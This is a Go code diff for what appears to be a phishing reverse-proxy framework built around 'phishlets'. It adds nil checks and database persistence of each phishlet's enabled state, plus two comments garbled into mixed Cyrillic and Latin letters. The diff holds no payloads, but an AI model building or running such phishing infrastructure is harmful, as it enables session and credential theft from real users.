@@ -16,6 +16,12 @@ import (
 func (p *HTTPProxy) loadPhishlets() error {
 	dir := p.cfg.PhishletsPath
 
+	// nothing to do if no path configured
+	if dir == "" {
+		p.logger.Debug("Phishlets path is empty, skipping load")
+		return nil
+	}
+
 	// Проверка существования директории
 	if _, err := os.Stat(dir); os.IsNotExist(err) {
 		p.logger.Info("Phishlets directory does not exist, creating", zap.String("path", dir))
@@ -75,18 +81,28 @@ func (p *HTTPProxy) loadPhishlet(filename string) error {
 	// Сохранение в память
 	p.phishlets[phishlet.ID] = &phishlet
 
+	// Determine enabled state from database if present
+	if p.db != nil {
+		if dbEntry, err := p.db.GetPhishlet(phishlet.ID); err == nil {
+			phishlet.Enabled = dbEntry.Enabled
+		}
+	}
+
 	// Сохранение в БД и логирование
 	targetDomain := "unknown"
 	if len(phishlet.ProxyHosts) > 0 {
 		targetDomain = phishlet.ProxyHosts[0].Domain
-		dbPhishlet := &database.Phishlet{
-			ID:      phishlet.ID,
-			Name:    phishlet.ID,
-			Config:  string(data),
-			Enabled: false,
-		}
-		if err := p.db.CreatePhishlet(dbPhishlet); err != nil {
-			p.logger.Warn("Failed to save phishlet to DB", zap.Error(err))
+		// persist to database if available (new entry)
+		if p.db != nil {
+			dbPhishlet := &database.Phishlet{
+				ID:      phishlet.ID,
+				Name:    phishlet.ID,
+				Config:  string(data),
+				Enabled: phishlet.Enabled,
+			}
+			if err := p.db.CreatePhishlet(dbPhishlet); err != nil {
+				p.logger.Warn("Failed to save phishlet to DB", zap.Error(err))
+			}
 		}
 	}
 
@@ -181,29 +197,40 @@ func (p *HTTPProxy) ListPhishlets() []*Phishlet {
 	return phishlets
 }
 
-// EnablePhishlet активирует phishlet
+// EnablePhishlet активирует phishлет
 func (p *HTTPProxy) EnablePhishlet(id string) error {
 	p.mu.Lock()
 	defer p.mu.Unlock()
 
-	_, ok := p.phishlets[id]
+	ph, ok := p.phishlets[id]
 	if !ok {
 		return fmt.Errorf("phishlet not found: %s", id)
 	}
-
+	ph.Enabled = true
+	if p.db != nil {
+		if err := p.db.UpdatePhishletEnabled(id, true); err != nil {
+			p.logger.Warn("Failed to update phishlet enabled state", zap.Error(err))
+		}
+	}
 	p.logger.Info("Phishlet enabled", zap.String("id", id))
 	return nil
 }
 
-// DisablePhishlet деактивирует phishlet
+// DisablePhishlet деактивирует phишlet
 func (p *HTTPProxy) DisablePhishlet(id string) error {
 	p.mu.Lock()
 	defer p.mu.Unlock()
 
-	if _, ok := p.phishlets[id]; !ok {
+	ph, ok := p.phishlets[id]
+	if !ok {
 		return fmt.Errorf("phishlet not found: %s", id)
 	}
-
+	ph.Enabled = false
+	if p.db != nil {
+		if err := p.db.UpdatePhishletEnabled(id, false); err != nil {
+			p.logger.Warn("Failed to update phishlet enabled state", zap.Error(err))
+		}
+	}
 	p.logger.Info("Phishlet disabled", zap.String("id", id))
 	return nil
 }
